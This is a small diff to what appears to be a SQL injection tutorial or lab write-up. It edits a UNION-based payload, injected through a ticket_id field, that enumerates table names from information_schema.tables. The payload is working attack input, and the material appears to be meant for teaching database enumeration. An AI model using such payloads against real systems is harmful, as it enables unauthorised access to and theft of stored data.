@@ -40,7 +40,7 @@ other builtin methods and attributes to further enumerate the database.
 
 ```diff
 SELECT name,issue_date,valid_until FROM tickets WHERE ticket_id="
-- 1" UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR '<br>') ,3 FROM information_schema.tables /*
+- 1" UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR "<br>") ,3 FROM information_schema.tables /*
 "
 ```
 # Version enumeration
